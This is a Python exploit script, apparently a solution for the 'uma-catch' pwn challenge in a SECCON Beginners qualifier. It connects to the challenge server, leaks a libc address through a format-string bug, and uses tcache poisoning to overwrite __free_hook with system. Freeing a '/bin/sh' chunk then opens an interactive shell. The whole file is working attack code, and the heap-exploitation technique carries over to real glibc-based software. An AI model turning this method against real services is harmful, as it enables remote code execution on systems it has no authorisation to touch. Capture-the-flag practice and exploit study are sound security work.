from ptrlib import *

def catch(index):
    sock.sendlineafter('> ', b'1')
    sock.sendlineafter('> ', str(index).encode())
    sock.sendlineafter('> ', b'bay')

def naming(index, payload):
    sock.sendlineafter('> ', b'2')
    sock.sendlineafter('> ', str(index).encode())
    sock.sendlineafter('> ', payload)

def show(index):
    sock.sendlineafter('> ', b'3')
    sock.sendlineafter('> ', str(index).encode())

def dance(index):
    sock.sendlineafter('> ', b'4')
    sock.sendlineafter('> ', str(index).encode())

def release(index):
    sock.sendlineafter('> ', b'5')
    sock.sendlineafter('> ', str(index).encode())

# sock = Process('./chall')
sock = Socket('uma-catch.quals.beginners.seccon.jp', 4101)

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')
libc_start_main_ret = 0x21bf7

# libc leak with fsb
catch(0)
naming(0, b'%11$p')
show(0)

libc.address = int(sock.recv(14).decode(), 16)-libc_start_main_ret
__free_hook = libc.address + libc.symbol('__free_hook')
system = libc.address + libc.symbol('system')
print('libc_base  = ', hex(libc.address))
print('__free_hook = ', hex(__free_hook))
print('system', hex(system))

# clear heap
release(0)

# memory write with tcache poisoning
catch(0)
release(0)
naming(0, p64(__free_hook))
catch(0)
catch(1) # __free_hook address
naming(1, p64(system))
naming(0, b'/bin/sh\0')
release(0)

sock.interactive()
